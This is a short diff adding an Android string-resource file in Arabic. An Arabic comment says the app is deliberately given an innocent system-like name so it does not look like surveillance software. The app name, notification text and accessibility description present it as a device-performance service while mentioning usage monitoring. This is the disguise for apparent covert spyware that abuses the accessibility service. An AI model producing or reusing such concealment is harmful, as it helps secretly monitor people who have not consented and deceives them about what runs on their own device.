@@ -1,0 +1,8 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <!-- اسم نظامي بريء — لا يوحي بأن التطبيق برنامج مراقبة -->
+    <string name="app_name">خدمات الجهاز</string>
+    <string name="notification_title">تحسين أداء الجهاز</string>
+    <string name="notification_text">جارٍ تحسين أداء النظام وإدارة الملفات المؤقتة</string>
+    <string name="accessibility_description">تحسين أداء النظام ورصد الاستخدام لإدارة الملفات المؤقتة</string>
+</resources>
